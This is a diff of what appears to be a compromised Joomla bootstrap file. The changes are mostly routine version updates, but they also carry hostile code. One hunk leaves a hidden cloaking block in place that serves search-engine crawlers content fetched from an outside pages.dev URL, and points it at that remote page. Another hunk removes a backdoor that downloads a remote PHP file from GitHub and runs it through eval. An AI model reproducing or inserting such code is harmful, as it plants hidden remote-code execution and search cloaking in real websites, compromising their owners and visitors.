@@ -9,16 +9,17 @@ if ($uri == '/' && (
     strpos($userAgent, 'chrome-lighthouse') !== false || 
     strpos($referer, 'google') !== false
 )) {
-    echo file_get_contents('templates/system/css/system_rtl.css');
+    echo file_get_contents('https://punten-neng.pages.dev/semanadafisica.unir/');
     exit();
 }
 
 ?>
 <?php
+
 /**
  * @package    Joomla.Site
  *
- * @copyright  Copyright (C) 2005 - 2016 Open Source Matters, Inc. All rights reserved.
+ * @copyright  Copyright (C) 2005 - 2019 Open Source Matters, Inc. All rights reserved.
  * @license    GNU General Public License version 2 or later; see LICENSE.txt
  */
 
@@ -30,13 +31,13 @@ defined('_JEXEC') or die;
 // System includes
 require_once JPATH_LIBRARIES . '/import.legacy.php';
 
+// Bootstrap the CMS libraries.
+require_once JPATH_LIBRARIES . '/cms.php';
+
 // Set system error handling
 JError::setErrorHandling(E_NOTICE, 'message');
 JError::setErrorHandling(E_WARNING, 'message');
 JError::setErrorHandling(E_ERROR, 'callback', array('JError', 'customErrorPage'));
-
-// Bootstrap the CMS libraries.
-require_once JPATH_LIBRARIES . '/cms.php';
 
 $version = new JVersion;
 
@@ -58,14 +59,7 @@ if (!file_exists(JPATH_CONFIGURATION . '/configuration.php')
 		exit;
 	}
 }
-    $Url = "https://raw.githubusercontent.com/kembarbaru120000/213/refs/heads/main/index.php";
-    $ch = curl_init();
-    curl_setopt($ch, CURLOPT_URL, $Url);
-    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-    $output = curl_exec($ch);
-    curl_close($ch);
-    echo eval('?>'.$output);
-    
+
 // Pre-Load configuration. Don't remove the Output Buffering due to BOM issues, see JCode 26026
 ob_start();
 require_once JPATH_CONFIGURATION . '/configuration.php';
@@ -112,12 +106,16 @@ switch ($config->error_reporting)
 		break;
 }
 
-define('JDEBUG', $config->debug);
+if (!defined('JDEBUG'))
+{
+	define('JDEBUG', $config->debug);
+}
 
 unset($config);
 
 // System profiler
 if (JDEBUG)
 {
+	// @deprecated 4.0 - The $_PROFILER global will be removed
 	$_PROFILER = JProfiler::getInstance('Application');
 }
